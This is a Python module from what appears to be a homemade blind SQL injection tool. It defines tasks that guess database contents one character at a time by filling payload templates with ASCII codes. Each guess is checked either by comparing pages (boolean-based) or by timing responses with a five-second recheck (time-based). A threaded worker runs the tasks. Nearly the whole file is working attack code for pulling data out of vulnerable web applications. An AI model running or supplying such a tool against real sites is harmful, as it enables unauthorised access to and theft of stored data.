#!/usr/bin/env python
#--*-- coding:utf-8 --*--

from random import randint
from time import ctime
from time import sleep

import queue
import threading
import time

class MyTask(object):
    def __init__(self, urls, payload, data_payload, id, top_boundaries, param, i):
        self.urls = urls
        self.payload = payload
        self.data_payload = data_payload
        self.id = id
        self.top_boundaries = top_boundaries
        self.param = param
        self.i = i

    def work(self):
        for j in range(32,123):   
            true_payload = self.payload.replace('[DATA]', self.data_payload).replace('[POSITION]', str(self.i)).replace('[DATANUM]', str(j))
            true_url = self.urls.http_payload(self.param, true_payload, self.top_boundaries)
            if self.urls.check_url_page(self.id, true_url):
                return (self.i,j)
        return None

    def work2(self):
        while True:
            for j in range(32,123):
                true_payload = self.payload["payload"].replace('[DATA]', self.data_payload).replace('[POSITION]', str(self.i)).replace('[DATANUM]', str(j))
                true_url = self.urls.http_payload(self.param, true_payload, self.top_boundaries)
                if self.urls.check_url_time(true_url):
                    time.sleep(5)
                    if self.urls.check_url_time(true_url):
                        return (self.i,j)

    def test(self):
        '''
            多线程测试结果
        '''
        return self.i

class MyThread(threading.Thread):
    def __init__(self, my_queue, blind_type):
        self.my_queue = my_queue
        self.blind_type = blind_type
        self.result = None
        super(MyThread, self).__init__()

    def run(self):
        while True:
            if self.my_queue.qsize() > 0:
                if self.blind_type == "bool":
                    self.result = self.my_queue.get(False).work()
                elif self.blind_type == "time":
                    self.result = self.my_queue.get(False).work2()
                else:
                    self.result = self.my_queue.get(False).test()
                if self.result is not None:
                    break
            else:
                break